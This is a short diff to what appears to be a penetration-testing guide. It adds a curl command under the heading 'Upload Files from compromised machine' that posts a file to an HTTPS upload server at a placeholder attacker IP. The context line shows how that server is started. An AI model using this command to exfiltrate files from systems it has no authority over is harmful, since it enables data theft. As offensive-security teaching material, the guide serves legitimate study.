@@ -109,6 +109,8 @@ sudo python3 -m uploadserver 443 --server-certificate <PATH TO CERTIFICATE>
 ```
 
 #### 4) Upload Files from compromised machine
-
+```bash
+curl -X POST https://<IP>/upload -F 'files=@<PATH TO FILE>' -
+```
 
 
